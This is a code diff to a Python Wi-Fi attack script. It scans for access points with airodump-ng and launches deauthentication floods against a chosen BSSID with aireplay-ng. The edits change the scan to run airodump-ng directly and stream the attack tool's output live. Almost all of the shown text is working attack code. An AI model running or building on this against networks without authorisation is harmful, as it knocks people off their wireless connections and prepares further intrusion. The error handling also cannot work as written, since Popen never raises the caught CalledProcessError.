@@ -34,11 +34,11 @@ signal.signal(signal.SIGINT, handle_exit)
 
 def scan_networks():
     """Open a terminal to scan for nearby networks."""
-    print("[*] Opening a terminal to scan for networks...")
+    print("[*] Scanning networks... This window will now open and display the APs.")
     try:
-        subprocess.Popen(["xfce4-terminal", "-e", f"airodump-ng {monitor_interface}"])
+        subprocess.Popen(["airodump-ng", monitor_interface])
     except FileNotFoundError:
-        print("[!] Terminal not found. Install xfce4-terminal or change terminal emulator.")
+        print("[!] Terminal or airodump-ng not found. Install airodump-ng or change terminal emulator.")
         exit(1)
 
 def set_channel(channel):
@@ -76,12 +76,17 @@ def perform_deauth(bssid, channel, packet_count):
     
     print(f"[*] Launching deauth attack on BSSID: {bssid} with {packet_count} packets...")
     try:
-        # Execute aireplay-ng
-        result = subprocess.run(
+        # Execute aireplay-ng and capture output line by line
+        process = subprocess.Popen(
             ["aireplay-ng", "--deauth", str(packet_count), "-a", bssid, monitor_interface],
-            check=True, capture_output=True, text=True
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
         )
-        print(result.stdout)  # Output of aireplay-ng if successful
+
+        # Print each line of output in real-time
+        for line in process.stdout:
+            print(line.strip())
+        
+        process.wait()  # Wait for the process to complete
     except subprocess.CalledProcessError as e:
         print(f"[!] Error executing deauth attack: {e}")
         print(f"[!] Output: {e.output}")
